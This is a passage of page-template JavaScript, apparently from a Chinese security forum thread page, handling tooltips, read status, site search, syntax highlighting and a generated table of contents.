        } else {
		$.tips(message, $(that), {
			
			time: 4000,
			tips: [1,'#748691']
		});
	}
	})
})
</script><script>
xn_read_unread({"222921": "1511429404"}, 222921);
</script><script>
jsearch_form = $('#search_form');
jsearch_form.on('submit', function() {
	var keyword = jsearch_form.find('input[name="keyword"]').val();
	var url = xn.url('search-'+xn.urlencode(keyword));
	window.location = url;
	return false;
});
</script><script>
// 语法高亮
if($('div.message pre').length > 0) {
	$.require_css('plugin/xn_syntax_hightlighter/syntax_hightlighter/syntax.css');
	$.require('plugin/xn_syntax_hightlighter/syntax_hightlighter/syntax.js', function() {
		SyntaxHighlighter.all();
	});
}
</script>

<!-- 目录生成JS -->
<script src="https://bbs.kanxue.com/view/js/tocbot.min.js"></script>
<script>
	$(function () {
		// 目录生成 start
		var header_div = ['h1', 'h2', 'h3'];
		var show_tocbot = 0;
		for (var i = 0; i < header_div.length; i++) {
			var h_ob = $(".message_card .message " + header_div[i]);

			if (h_ob.length > 0) show_tocbot = 1;
			h_ob.each(function (index) {
				$(this).attr("id", "msg_header_" + header_div[i] + "_" + index);
			});
		}
		if (show_tocbot == 1) {
			$(".show_tocbot").show();
		}
		tocbot.init({
			// Where to render the table of contents.
			tocSelector: '.js-toc',
			// Where to grab the headings to build the table of contents.
			contentSelector: '.message_card .message',
			// Which headings to grab inside of the contentSelector element.
			headingSelector: 'h1, h2, h3',
			// For headings inside relative or absolute positioned containers within content.
			hasInnerContainers: true,
		});
		// $(window).on("scroll",function(){
		// 	console.log(1);
		// })

		// 选择需要观察变动的节点
		const targetNode = document.getElementById('js-toc');

		// 观察器的配置（需要观察什么变动）
		const config = {
			attributes: true,
			childList: true,
			subtree: true
		};

		// 当观察到变动时执行的回调函数
		const callback = function (mutationsList, observer) {
			// Use traditional 'for loops' for IE 11
			for (let mutation of mutationsList) {
				// if (mutation.type === 'childList') {
				// 	console.log('A child node has been added or removed.');
				// }
				// else 
				if (mutation.type === 'attributes') {
					targetNode.scrollTo(0, document.getElementsByClassName("is-active-li")[0].offsetTop);
				}
			}
		};

		// 创建一个观察器实例并传入回调函数
		const observer = new MutationObserver(callback);
		// 以上述配置开始观察目标节点
		observer.observe(targetNode, config);
		// 目录生成 end



	})
</script>
